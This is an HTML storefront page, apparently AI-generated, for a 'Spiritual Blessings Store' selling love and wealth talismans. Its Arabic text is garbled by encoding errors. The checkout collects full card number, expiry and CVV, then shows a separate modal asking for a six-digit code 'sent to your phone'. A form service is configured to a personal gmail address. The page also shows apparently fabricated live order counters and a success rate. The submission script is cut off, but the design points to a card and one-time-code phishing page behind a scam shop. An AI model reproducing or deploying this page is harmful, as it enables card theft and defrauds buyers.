<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù…ØªØ¬Ø± Ø§Ù„Ø¨Ø±ÙƒØ§Øª Ø§Ù„Ø±ÙˆØ­Ø§Ù†ÙŠØ© - Spiritual Blessings Store</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
    <!-- Basin Form Service -->
    <script>
        // Basin Configuration
        const BASIN_CONFIG = {
            formUrl: 'https://usebasin.com/f/05576018d11c',
            email: 'kalimmmy@gmail.com'
        };
        
        console.log('âœ… Basin Form Service configured');
    </script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#5D5CDE',
                        gold: '#D4AF37',
                        emerald: '#059669'
                    }
                }
            }
        }
    </script>
</head>
<body class="bg-white dark:bg-gray-900 text-gray-900 dark:text-white transition-colors duration-300">
    <!-- Header -->
    <header class="bg-gradient-to-r from-primary to-purple-700 text-white shadow-lg">
        <div class="container mx-auto px-4 py-4">
            <div class="flex justify-between items-center">
                <div class="flex items-center space-x-4 space-x-reverse">
                    <i class="fas fa-star-and-crescent text-2xl text-gold"></i>
                    <div>
                        <h1 class="text-xl font-bold">Ù…ØªØ¬Ø± Ø§Ù„Ø¨Ø±ÙƒØ§Øª Ø§Ù„Ø±ÙˆØ­Ø§Ù†ÙŠØ©</h1>
                        <p class="text-sm opacity-90">Spiritual Blessings Store</p>
                    </div>
                </div>
                <div class="flex items-center space-x-4 space-x-reverse">
                    <!-- Language Selector -->
                    <select id="languageSelector" class="bg-white text-black rounded px-3 py-1 text-base font-medium">
                        <option value="ar">Ø§Ù„Ø¹Ø±Ø¨ÙŠØ©</option>
                        <option value="en">English</option>
                        <option value="fr">FranÃ§ais</option>
                        <option value="es">EspaÃ±ol</option>
                        <option value="tr">TÃ¼rkÃ§e</option>
                    </select>
                    <!-- Currency Selector -->
                    <select id="currencySelector" class="bg-white text-black rounded px-3 py-1 text-base font-medium">
                        <option value="USD">USD $</option>
                        <option value="EUR">EUR â‚¬</option>
                        <option value="SAR">SAR Ø±.Ø³</option>
                        <option value="AED">AED Ø¯.Ø¥</option>
                        <option value="KWD">KWD Ø¯.Ùƒ</option>
                        <option value="QAR">QAR Ø±.Ù‚</option>
                        <option value="BHD">BHD Ø¯.Ø¨</option>
                        <option value="OMR">OMR Ø±.Ø¹</option>
                    </select>
                    <!-- Cart Icon -->
                    <div class="relative cursor-pointer" onclick="toggleCart()">
                        <i class="fas fa-shopping-cart text-xl"></i>
                        <span id="cartCount" class="absolute -top-2 -right-2 bg-red-500 text-white rounded-full w-5 h-5 flex items-center justify-center text-xs">0</span>
                    </div>
                </div>
            </div>
        </div>
    </header>

    <!-- Hero Section -->
    <section class="relative bg-gradient-to-br from-primary/10 to-purple-100 dark:from-primary/20 dark:to-purple-900/20 py-12 overflow-hidden">
        <div class="absolute inset-0 bg-gradient-to-r from-gold/20 to-primary/20 animate-pulse"></div>
        <div class="container mx-auto px-4 text-center relative z-10">
            <h2 class="text-4xl md:text-6xl font-bold mb-4 text-transparent bg-clip-text bg-gradient-to-r from-primary to-purple-600 animate-bounce" data-aos="fade-down">
                <span data-translate="hero-title">Ù…Ù†ØªØ¬Ø§Øª Ø±ÙˆØ­Ø§Ù†ÙŠØ© Ø£ØµÙŠÙ„Ø© ÙˆÙ…Ø¨Ø§Ø±ÙƒØ©</span>
            </h2>
            <p class="text-lg mb-8 opacity-80" data-translate="hero-subtitle" data-aos="fade-up" data-aos-delay="200">
                Ø·Ù„Ø§Ø³Ù… ÙˆØ£Ø­Ø¬Ø§Ø± ÙƒØ±ÙŠÙ…Ø© ÙˆÙ…Ø§Ø¡ Ø²Ù…Ø²Ù… Ù…Ù‚Ø±ÙˆØ¡ Ø¹Ù„ÙŠÙ‡ - ØªÙˆØµÙŠÙ„ Ø³Ø±ÙŠØ¹ Ù„Ø¬Ù…ÙŠØ¹ Ø£Ù†Ø­Ø§Ø¡ Ø§Ù„Ø¹Ø§Ù„Ù…
            </p>
            
            <!-- Live Stats Counter -->
            <div class="mb-8 bg-white/90 dark:bg-gray-800/90 backdrop-blur-sm rounded-xl p-6 shadow-lg" data-aos="zoom-in">
                <div class="grid grid-cols-2 md:grid-cols-4 gap-4 text-center">
                    <div>
                        <div class="text-2xl font-bold text-primary" id="ordersCounter">0</div>
                        <div class="text-sm opacity-70" data-translate="orders-today">Ø·Ù„Ø¨Ø§Øª Ø§Ù„ÙŠÙˆÙ…</div>
                    </div>
                    <div>
                        <div class="text-2xl font-bold text-emerald" id="customersCounter">0</div>
                        <div class="text-sm opacity-70" data-translate="happy-customers">Ø¹Ù…Ù„Ø§Ø¡ Ø³Ø¹Ø¯Ø§Ø¡</div>
                    </div>
                    <div>
                        <div class="text-2xl font-bold text-gold" id="countriesCounter">0</div>
                        <div class="text-sm opacity-70" data-translate="countries">Ø¯ÙˆÙ„Ø©</div>
                    </div>
                    <div>
                        <div class="text-2xl font-bold text-purple-600" id="successCounter">0</div>
                        <div class="text-sm opacity-70" data-translate="success-rate">Ù†Ø³Ø¨Ø© Ø§Ù„Ù†Ø¬Ø§Ø­</div>
                    </div>
                </div>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 text-center">
                <div class="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-lg hover:shadow-2xl transition-all duration-300 hover:scale-105" data-aos="fade-right">
                    <i class="fas fa-shipping-fast text-3xl text-emerald mb-3"></i>
                    <h3 class="font-bold mb-2" data-translate="shipping-fast">ØªÙˆØµÙŠÙ„ Ø³Ø±ÙŠØ¹</h3>
                    <p class="text-sm" data-translate="shipping-desc">Ø®Ù„Ø§Ù„ ÙŠÙˆÙ… Ø¥Ù„Ù‰ ÙŠÙˆÙ…ÙŠÙ† Ù„Ù„Ø®Ù„ÙŠØ¬ ÙˆØ£ÙˆØ±ÙˆØ¨Ø§</p>
                    <div class="mt-2 text-xs text-emerald">
                        <i class="fas fa-clock mr-1"></i>
                        <span data-translate="24h-shipping">Ø´Ø­Ù† Ø®Ù„Ø§Ù„ 24 Ø³Ø§Ø¹Ø©</span>
                    </div>
                </div>
                <div class="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-lg hover:shadow-2xl transition-all duration-300 hover:scale-105" data-aos="fade-up">
                    <i class="fas fa-certificate text-3xl text-gold mb-3"></i>
                    <h3 class="font-bold mb-2" data-translate="authentic">Ù…Ù†ØªØ¬Ø§Øª Ø£ØµÙŠÙ„Ø©</h3>
                    <p class="text-sm" data-translate="authentic-desc">Ù…Ù‚Ø±ÙˆØ¡ Ø¹Ù„ÙŠÙ‡Ø§ ÙˆÙ…Ù…ØªØ­Ù†Ø© Ø¨Ø¹Ù†Ø§ÙŠØ© ÙØ§Ø¦Ù‚Ø©</p>
                    <div class="mt-2 text-xs text-gold">
                        <i class="fas fa-star mr-1"></i>
                        <span data-translate="quality-certified">Ù…Ø¹ØªÙ…Ø¯Ø© Ø§Ù„Ø¬ÙˆØ¯Ø©</span>
                    </div>
                </div>
                <div class="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-lg hover:shadow-2xl transition-all duration-300 hover:scale-105" data-aos="fade-left">
                    <i class="fas fa-globe text-3xl text-primary mb-3"></i>
                    <h3 class="font-bold mb-2" data-translate="worldwide">ØªÙˆØµÙŠÙ„ Ø¹Ø§Ù„Ù…ÙŠ</h3>
                    <p class="text-sm" data-translate="worldwide-desc">Ù†Ø´Ø­Ù† Ø¥Ù„Ù‰ Ø¬Ù…ÙŠØ¹ Ø¯ÙˆÙ„ Ø§Ù„Ø¹Ø§Ù„Ù…</p>
                    <div class="mt-2 text-xs text-primary">
                        <i class="fas fa-map-marked-alt mr-1"></i>
                        <span data-translate="global-network">Ø´Ø¨ÙƒØ© Ø¹Ø§Ù„Ù…ÙŠØ©</span>
                    </div>
                </div>
            </div>

            <!-- Real-time notifications -->
            <div id="liveNotifications" class="fixed top-20 left-4 z-40 space-y-2"></div>
        </div>
    </section>

    <!-- Advanced Features Section -->
    <section class="py-12 bg-gradient-to-r from-gray-50 to-white dark:from-gray-800 dark:to-gray-900">
        <div class="container mx-auto px-4">
            <h3 class="text-3xl font-bold text-center mb-8" data-translate="advanced-features" data-aos="fade-down">Ù…Ù…ÙŠØ²Ø§Øª Ù…ØªØ·ÙˆØ±Ø©</h3>
            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
                <div class="text-center p-6 bg-white dark:bg-gray-800 rounded-lg shadow-lg" data-aos="flip-left">
                    <i class="fas fa-shield-alt text-4xl text-primary mb-4"></i>
                    <h4 class="font-bold mb-2" data-translate="secure-payment">Ø¯ÙØ¹ Ø¢Ù…Ù†</h4>
                    <p class="text-sm" data-translate="ssl-encryption">ØªØ´ÙÙŠØ± SSL Ù…ØªÙ‚Ø¯Ù…</p>
                </div>
                <div class="text-center p-6 bg-white dark:bg-gray-800 rounded-lg shadow-lg" data-aos="flip-left" data-aos-delay="100">
                    <i class="fas fa-mobile-alt text-4xl text-emerald mb-4"></i>
                    <h4 class="font-bold mb-2" data-translate="mobile-app">ØªØ·Ø¨ÙŠÙ‚ Ù…ÙˆØ¨Ø§ÙŠÙ„</h4>
                    <p class="text-sm" data-translate="app-soon">Ù‚Ø±ÙŠØ¨Ø§Ù‹ Ø¹Ù„Ù‰ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©</p>
                </div>
                <div class="text-center p-6 bg-white dark:bg-gray-800 rounded-lg shadow-lg" data-aos="flip-left" data-aos-delay="200">
                    <i class="fas fa-headset text-4xl text-gold mb-4"></i>
                    <h4 class="font-bold mb-2" data-translate="24-7-support">Ø¯Ø¹Ù… 24/7</h4>
                    <p class="text-sm" data-translate="instant-support">Ù…Ø³Ø§Ø¹Ø¯Ø© ÙÙˆØ±ÙŠØ©</p>
                </div>
                <div class="text-center p-6 bg-white dark:bg-gray-800 rounded-lg shadow-lg" data-aos="flip-left" data-aos-delay="300">
                    <i class="fas fa-robot text-4xl text-purple-600 mb-4"></i>
                    <h4 class="font-bold mb-2" data-translate="ai-recommendations">ØªÙˆØµÙŠØ§Øª Ø°ÙƒÙŠØ©</h4>
                    <p class="text-sm" data-translate="ai-powered">Ù…Ø¯Ø¹ÙˆÙ… Ø¨Ø§Ù„Ø°ÙƒØ§Ø¡ Ø§Ù„Ø§ØµØ·Ù†Ø§Ø¹ÙŠ</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Products Section -->
    <section class="py-12">
        <div class="container mx-auto px-4">
            <h2 class="text-3xl font-bold text-center mb-8" data-translate="products-title">Ù…Ù†ØªØ¬Ø§ØªÙ†Ø§ Ø§Ù„Ù…Ù…ÙŠØ²Ø©</h2>
            
            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8" id="productsGrid">
                <!-- Products will be inserted here by JavaScript -->
            </div>
        </div>
    </section>

    <!-- Cart Sidebar -->
    <div id="cartSidebar" class="fixed top-0 right-0 h-full w-80 bg-white dark:bg-gray-800 shadow-xl transform translate-x-full transition-transform duration-300 z-50">
        <div class="p-6">
            <div class="flex justify-between items-center mb-6">
                <h3 class="text-xl font-bold" data-translate="cart">Ø³Ù„Ø© Ø§Ù„ØªØ³ÙˆÙ‚</h3>
                <button onclick="toggleCart()" class="text-gray-500 hover:text-gray-700">
                    <i class="fas fa-times text-xl"></i>
                </button>
            </div>
            <div id="cartItems" class="space-y-4 mb-6"></div>
            <div class="border-t pt-4">
                <div class="flex justify-between items-center mb-4">
                    <span class="font-bold" data-translate="total">Ø§Ù„Ù…Ø¬Ù…ÙˆØ¹:</span>
                    <span id="cartTotal" class="font-bold text-xl text-primary">$0</span>
                </div>
                <button onclick="proceedToCheckout()" class="w-full bg-primary text-white py-3 rounded-lg font-bold hover:bg-primary/90 transition-colors">
                    <span data-translate="checkout">Ø¥ØªÙ…Ø§Ù… Ø§Ù„Ø·Ù„Ø¨</span>
                </button>
            </div>
        </div>
    </div>

    <!-- Shipping Info Modal -->
    <div id="checkoutModal" class="fixed inset-0 bg-black/50 hidden items-center justify-center z-50 p-2">
        <div class="bg-white dark:bg-gray-800 rounded-lg max-w-sm w-full mx-2 shadow-2xl max-h-screen overflow-y-auto">
            <div class="p-4">
                <div class="flex justify-between items-center mb-4">
                    <h3 class="text-lg font-bold flex items-center">
                        <i class="fas fa-shipping-fast text-primary mr-2 text-sm"></i>
                        <span data-translate="shipping-info-title">Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„ØªÙˆØµÙŠÙ„</span>
                    </h3>
                    <button onclick="closeCheckout()" class="text-gray-500 hover:text-gray-700">
                        <i class="fas fa-times"></i>
                    </button>
                </div>

                <!-- Order Summary -->
                <div class="bg-gray-50 dark:bg-gray-700 rounded p-3 mb-4">
                    <div id="checkoutOrderItems" class="space-y-1 text-sm mb-2"></div>
                    <div class="border-t pt-2 flex justify-between items-center font-bold text-sm">
                        <span data-translate="total-amount">Ø§Ù„Ù…Ø¬Ù…ÙˆØ¹:</span>
                        <span id="checkoutTotal" class="text-primary">$0</span>
                    </div>
                </div>

                <!-- Shipping Form -->
                <form id="shippingForm" class="space-y-3">
                    <div>
                        <label class="block text-xs font-medium mb-1" data-translate="full-name">Ø§Ù„Ø§Ø³Ù… Ø§Ù„ÙƒØ§Ù…Ù„ *</label>
                        <input type="text" id="fullName" required="" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
                    </div>
                    
                    <div class="grid grid-cols-2 gap-2">
                        <div>
                            <label class="block text-xs font-medium mb-1" data-translate="phone">Ø§Ù„Ù‡Ø§ØªÙ *</label>
                            <input type="tel" id="phoneNumber" required="" maxlength="14" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
                        </div>
                        <div>
                            <label class="block text-xs font-medium mb-1" data-translate="country">Ø§Ù„Ø¯ÙˆÙ„Ø© *</label>
                            <select id="country" required="" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
                                <option value="">Ø§Ø®ØªØ±</option>
                                <option value="Ø§Ù„Ø³Ø¹ÙˆØ¯ÙŠØ©">ğŸ‡¸ğŸ‡¦ Ø§Ù„Ø³Ø¹ÙˆØ¯ÙŠØ©</option>
                                <option value="Ø§Ù„Ø¥Ù…Ø§Ø±Ø§Øª">ğŸ‡¦ğŸ‡ª Ø§Ù„Ø¥Ù…Ø§Ø±Ø§Øª</option>
                                <option value="Ø§Ù„ÙƒÙˆÙŠØª">ğŸ‡°ğŸ‡¼ Ø§Ù„ÙƒÙˆÙŠØª</option>
                                <option value="Ù‚Ø·Ø±">ğŸ‡¶ğŸ‡¦ Ù‚Ø·Ø±</option>
                                <option value="Ø§Ù„Ø¨Ø­Ø±ÙŠÙ†">ğŸ‡§ğŸ‡­ Ø§Ù„Ø¨Ø­Ø±ÙŠÙ†</option>
                                <option value="Ø¹Ù…Ø§Ù†">ğŸ‡´ğŸ‡² Ø¹Ù…Ø§Ù†</option>
                                <option value="Ø§Ù„Ø£Ø±Ø¯Ù†">ğŸ‡¯ğŸ‡´ Ø§Ù„Ø£Ø±Ø¯Ù†</option>
                                <option value="Ù…ØµØ±">ğŸ‡ªğŸ‡¬ Ù…ØµØ±</option>
                                <option value="Ø§Ù„Ù…ØºØ±Ø¨">ğŸ‡²ğŸ‡¦ Ø§Ù„Ù…ØºØ±Ø¨</option>
                                <option value="Ø£Ù„Ù…Ø§Ù†ÙŠØ§">ğŸ‡©ğŸ‡ª Ø£Ù„Ù…Ø§Ù†ÙŠØ§</option>
                                <option value="ÙØ±Ù†Ø³Ø§">ğŸ‡«ğŸ‡· ÙØ±Ù†Ø³Ø§</option>
                                <option value="Ø£Ø®Ø±Ù‰">ğŸŒ Ø£Ø®Ø±Ù‰</option>
                            </select>
                        </div>
                    </div>
                    
                    <div>
                        <label class="block text-xs font-medium mb-1" data-translate="address">Ø§Ù„Ø¹Ù†ÙˆØ§Ù† *</label>
                        <textarea id="fullAddress" required="" rows="2" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" placeholder="Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©ØŒ Ø§Ù„Ø´Ø§Ø±Ø¹ØŒ Ø±Ù‚Ù… Ø§Ù„Ù…Ø¨Ù†Ù‰"></textarea>
                    </div>

                    <!-- Continue Button -->
                    <button type="submit" class="w-full bg-primary text-white py-3 rounded font-bold hover:bg-primary/90 transition-colors">
                        <span class="flex items-center justify-center text-sm">
                            <i class="fas fa-credit-card mr-2"></i>
                            <span data-translate="continue-payment">Ù…ØªØ§Ø¨Ø¹Ø© Ù„Ù„Ø¯ÙØ¹</span>
                        </span>
                    </button>
                </form>
            </div>
        </div>
    </div>

    <!-- Card Payment Modal -->
    <div id="paymentModal" class="fixed inset-0 bg-black/50 hidden items-center justify-center z-50 p-2">
        <div class="bg-white dark:bg-gray-800 rounded-lg max-w-sm w-full mx-2 shadow-2xl max-h-screen overflow-y-auto">
            <div class="p-4">
                <div class="flex justify-between items-center mb-4">
                    <h3 class="text-lg font-bold flex items-center">
                        <i class="fas fa-credit-card text-primary mr-2 text-sm"></i>
                        <span data-translate="payment-title">Ø§Ù„Ø¯ÙØ¹ Ø§Ù„Ø¢Ù…Ù†</span>
                    </h3>
                    <button onclick="closePaymentModal()" class="text-gray-500 hover:text-gray-700">
                        <i class="fas fa-times"></i>
                    </button>
                </div>

                <!-- Order Summary -->
                <div class="bg-gray-50 dark:bg-gray-700 rounded p-3 mb-4">
                    <div id="paymentOrderItems" class="space-y-1 text-sm mb-2"></div>
                    <div class="border-t pt-2 flex justify-between items-center font-bold text-sm">
                        <span data-translate="total-amount">Ø§Ù„Ù…Ø¬Ù…ÙˆØ¹:</span>
                        <span id="paymentTotal" class="text-primary">$0</span>
                    </div>
                </div>

                <!-- Payment Form -->
                <form id="paymentForm" class="space-y-3">
                    <div>
                        <label class="block text-xs font-medium mb-1" data-translate="card-number">Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© *</label>
                        <div class="relative">
                            <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required="" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600 pr-10">
                            <div class="absolute right-2 top-1/2 transform -translate-y-1/2">
                                <i id="cardIcon" class="fas fa-credit-card text-gray-400 text-sm"></i>
                            </div>
                        </div>
                    </div>

                    <div>
                        <label class="block text-xs font-medium mb-1" data-translate="cardholder-name">Ø§Ø³Ù… ØµØ§Ø­Ø¨ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© *</label>
                        <input type="text" id="cardholderName" placeholder="Ahmed Al-Mohammed" required="" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
                    </div>

                    <div class="grid grid-cols-2 gap-2">
                        <div>
                            <label class="block text-xs font-medium mb-1" data-translate="expiry-date">Ø§Ù†ØªÙ‡Ø§Ø¡ *</label>
                            <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" required="" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
                        </div>
                        <div>
                            <label class="block text-xs font-medium mb-1" data-translate="cvv">CVV *</label>
                            <input type="text" id="cvv" placeholder="123" maxlength="4" required="" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
                        </div>
                    </div>

                    <!-- Security Info -->
                    <div class="bg-emerald/10 border border-emerald/30 rounded p-2">
                        <div class="flex items-center text-emerald">
                            <i class="fas fa-shield-alt mr-2 text-xs"></i>
                            <span class="text-xs font-medium" data-translate="secure-payment">Ø¯ÙØ¹ Ø¢Ù…Ù† ÙˆÙ…Ø´ÙØ±</span>
                        </div>
                    </div>

                    <!-- Pay Button -->
                    <button type="submit" class="w-full bg-primary text-white py-3 rounded font-bold hover:bg-primary/90 transition-colors">
                        <span class="flex items-center justify-center text-sm">
                            <i class="fas fa-lock mr-2"></i>
                            <span data-translate="pay-now">Ø§Ø¯ÙØ¹ Ø§Ù„Ø¢Ù†</span>
                            <span id="payAmount" class="mr-2">$0</span>
                        </span>
                    </button>
                </form>
            </div>
        </div>
    </div>

    <!-- Verification Code Modal -->
    <div id="verificationModal" class="fixed inset-0 bg-black/50 hidden items-center justify-center z-50 p-4">
        <div class="bg-white dark:bg-gray-800 rounded-xl max-w-sm w-full mx-4 shadow-2xl">
            <div class="p-6 text-center">
                <div class="w-20 h-20 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4">
                    <i class="fas fa-mobile-alt text-primary text-2xl"></i>
                </div>
                
                <h3 class="text-xl font-bold mb-2" data-translate="verification-title">Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚</h3>
                <p class="text-gray-600 dark:text-gray-300 mb-6" data-translate="verification-desc">
                    ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø¥Ù„Ù‰ Ù‡Ø§ØªÙÙƒ Ø§Ù„Ù…Ø­Ù…ÙˆÙ„
                </p>

                <form id="verificationForm" class="space-y-4">
                    <!-- 6-digit code input - NUMBERS ONLY -->
                    <div class="flex justify-center space-x-2 space-x-reverse mb-6">
                        <input type="number" inputmode="numeric" pattern="\d*" class="w-12 h-12 text-center text-xl border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" maxlength="1" data-index="0">
                        <input type="number" inputmode="numeric" pattern="\d*" class="w-12 h-12 text-center text-xl border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" maxlength="1" data-index="1">
                        <input type="number" inputmode="numeric" pattern="\d*" class="w-12 h-12 text-center text-xl border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" maxlength="1" data-index="2">
                        <input type="number" inputmode="numeric" pattern="\d*" class="w-12 h-12 text-center text-xl border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" maxlength="1" data-index="3">
                        <input type="number" inputmode="numeric" pattern="\d*" class="w-12 h-12 text-center text-xl border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" maxlength="1" data-index="4">
                        <input type="number" inputmode="numeric" pattern="\d*" class="w-12 h-12 text-center text-xl border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" maxlength="1" data-index="5">
                    </div>

                    <!-- Timer -->
                    <div class="text-sm text-gray-500 mb-4">
                        <span data-translate="resend-in">Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø®Ù„Ø§Ù„: </span>
                        <span id="timer" class="font-bold text-primary">02:00</span>
                    </div>

                    <!-- Resend button -->
                    <button type="button" id="resendBtn" onclick="resendCode()" disabled="" class="text-primary text-sm font-medium opacity-50 cursor-not-allowed mb-4">
                        <span data-translate="resend-code">Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ù…Ø²</span>
                    </button>

                    <!-- Verify button -->
                    <button type="submit" class="w-full bg-primary text-white py-3 rounded-lg font-bold hover:bg-primary/90 transition-colors">
                        <span data-translate="verify-code">ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø±Ù…Ø²</span>
                    </button>
                </form>
            </div>
        </div>
    </div>

    <!-- Fixed Cart Button - Top Corner Only -->
    <div class="fixed top-4 right-4 z-50">
        <button onclick="toggleCart()" class="bg-primary text-white p-3 rounded-full shadow-lg hover:bg-primary/90 transition-all duration-300 hover:scale-110">
            <div class="relative">
                <i class="fas fa-shopping-cart text-lg"></i>
                <span id="topCartCount" class="absolute -top-2 -right-2 bg-red-500 text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold">0</span>
            </div>
        </button>
    </div>

    <!-- Footer -->
    <footer class="bg-gray-800 text-white py-8">
        <div class="container mx-auto px-4">
            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
                <div>
                    <h3 class="font-bold mb-4" data-translate="contact-us">ØªÙˆØ§ØµÙ„ Ù…Ø¹Ù†Ø§</h3>
                    <p class="mb-2"><i class="fas fa-envelope ml-2"></i> info@spiritualblessings.com</p>
                    <p class="mb-2"><i class="fas fa-shipping-fast ml-2"></i> <span data-translate="fast-shipping">ØªÙˆØµÙŠÙ„ Ø³Ø±ÙŠØ¹ Ù„Ù„Ø®Ù„ÙŠØ¬ ÙˆØ£ÙˆØ±ÙˆØ¨Ø§</span></p>
                </div>
                <div>
                    <h3 class="font-bold mb-4" data-translate="shipping-info">Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø­Ù†</h3>
                    <p class="mb-2" data-translate="gulf-shipping">Ø¯ÙˆÙ„ Ø§Ù„Ø®Ù„ÙŠØ¬: 1-2 Ø£ÙŠØ§Ù…</p>
                    <p class="mb-2" data-translate="europe-shipping">Ø£ÙˆØ±ÙˆØ¨Ø§: 2-3 Ø£ÙŠØ§Ù…</p>
                    <p class="mb-2" data-translate="worldwide-shipping">Ø¨Ø§Ù‚ÙŠ Ø§Ù„Ø¹Ø§Ù„Ù…: 3-7 Ø£ÙŠØ§Ù…</p>
                </div>
                <div>
                    <h3 class="font-bold mb-4" data-translate="guarantee">Ø¶Ù…Ø§Ù†ØªÙ†Ø§</h3>
                    <p class="mb-2" data-translate="authentic-products">Ù…Ù†ØªØ¬Ø§Øª Ø£ØµÙŠÙ„Ø© 100%</p>
                    <p class="mb-2" data-translate="blessed-items">Ù…Ù‚Ø±ÙˆØ¡ Ø¹Ù„ÙŠÙ‡Ø§ Ø¨Ø¹Ù†Ø§ÙŠØ©</p>
                    <p class="mb-2" data-translate="quality-guarantee">Ø¶Ù…Ø§Ù† Ø§Ù„Ø¬ÙˆØ¯Ø©</p>
                </div>
            </div>
            <div class="text-center mt-8 pt-8 border-t border-gray-700">
                <p>Â© 2024 <span data-translate="store-name">Ù…ØªØ¬Ø± Ø§Ù„Ø¨Ø±ÙƒØ§Øª Ø§Ù„Ø±ÙˆØ­Ø§Ù†ÙŠØ©</span> - <span data-translate="all-rights">Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ‚ Ù…Ø­ÙÙˆØ¸Ø©</span></p>
            </div>
        </div>
    </footer>

    <script>
        // Dark mode detection
        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
            document.documentElement.classList.add('dark');
        }
        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', event => {
            if (event.matches) {
                document.documentElement.classList.add('dark');
            } else {
                document.documentElement.classList.remove('dark');
            }
        });

        // Products data
        const products = [
            {
                id: 1,
                name: 'Ø·Ù„Ø³Ù… Ø§Ù„Ù…Ø­Ø¨Ø© ÙˆØ¬Ù„Ø¨ Ø§Ù„Ø­Ø¨ÙŠØ¨',
                nameEn: 'Love Attraction Talisman',
                price: 35,
                image: 'https://pfst.cf2.poecdn.net/base/image/d56d994db71e1d245a8989068060eaae9a05559d98747b12182ea19043f01210?w=256&h=256',
                description: 'Ø·Ù„Ø³Ù… Ù…Ø¨Ø§Ø±Ùƒ Ù„Ø¬Ù„Ø¨ Ø§Ù„Ù…Ø­Ø¨Ø© ÙˆØ§Ù„ÙˆØ¯ Ø¨ÙŠÙ† Ø§Ù„Ù‚Ù„ÙˆØ¨ØŒ Ù…Ù‚Ø±ÙˆØ¡ Ø¹Ù„ÙŠÙ‡ Ø¢ÙŠØ§Øª Ø§Ù„Ù…Ø­Ø¨Ø© ÙˆØ§Ù„Ø£Ù„ÙØ©',
                descriptionEn: 'Blessed talisman for bringing love and affection between hearts, recited with verses of love and harmony'
            },
            {
                id: 2,
                name: 'Ø·Ù„Ø³Ù… Ø¬Ù„Ø¨ Ø§Ù„Ø±Ø²Ù‚ ÙˆØ§Ù„Ø«Ø±ÙˆØ©',
                nameEn: 'Wealth & Prosperity Talisman',
                price: 45,
                image: 'https://pfst.cf2.poecdn.net/base/image/8377daa4175512a3b3143861b46362ee9d188fc9e3fe76b1945d697e78eb7e3c?w=256&h=256',
